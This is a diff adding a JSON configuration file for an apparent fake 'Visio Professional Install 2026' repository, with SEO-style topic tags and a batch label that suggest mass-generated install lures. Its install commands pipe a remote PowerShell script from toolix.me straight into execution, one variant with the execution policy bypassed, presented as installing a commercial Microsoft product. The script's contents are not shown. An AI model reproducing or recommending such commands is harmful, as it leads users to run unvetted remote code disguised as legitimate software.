@@ -1,0 +1,26 @@
+{
+  "repo": "Visio-Professional-Install-2026",
+  "product": "Visio Professional Install 2026",
+  "product_title": "Visio Professional Install",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-visio-install",
+    "visio-install-app",
+    "install-guide",
+    "desktop-software",
+    "repository-readme",
+    "visio-install-desktop-tool",
+    "visio-install-windows-tool",
+    "visio-install",
+    "visio-install-desktop-2026",
+    "windows-11"
+  ],
+  "site": "toolix.me"
+}
